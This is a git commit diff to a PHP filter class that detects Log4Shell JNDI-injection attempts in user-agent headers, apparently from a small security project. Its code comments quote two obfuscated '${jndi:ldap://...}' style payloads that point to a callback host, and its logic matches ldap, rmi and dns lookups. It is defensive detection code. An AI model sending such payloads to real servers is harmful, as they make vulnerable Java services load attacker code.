cf473e11e9170b99ea7c0a6fa013c82b83168402
Te Taipo <hokioi-security@protonmail.ch>
2021-12-12 11:45:43 +1300

    Update class_logjam_filter.php

--- class_logjam_filter.php
+++ class_logjam_filter.php
@@ -18,18 +18,18 @@ class Logjam_Filter {
         # Examples
         # - ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}
         # - ${jndi:${lower:l}${lower:d}a${lower:p}://[subdomain]${upper:a}[domain]:80/callback}            
-        $list = array( '$', '{', '}', ':', '-' );
-        $flist = str_replace( $list, '', $user_agent );
         if ( substr_count( $user_agent, '$' ) >= 4 &&
              substr_count( $user_agent, '{' ) >= 4 &&
              substr_count( $user_agent, '}' ) >= 4 &&
              substr_count( $user_agent, ':' ) >= 4 ) {
-             if ( false !== strpos( $flist, 'ldap' ) ||
-                  false !== strpos( $flist, 'rmip' ) ||
-                  false !== strpos( $flist, 'ldaps' ) ||
-                  false !== strpos( $flist, 'dns' ) ) {
-                  return true;
-             }
+                $list = array( '$', '{', '}', ':', '-' );
+                $flist = str_replace( $list, '', $user_agent );
+                if ( false !== strpos( $flist, 'ldap' ) ||
+                     false !== strpos( $flist, 'rmip' ) ||
+                     false !== strpos( $flist, 'ldaps' ) ||
+                     false !== strpos( $flist, 'dns' ) ) {
+                     return true;
+                }
         }
     return false;
     }
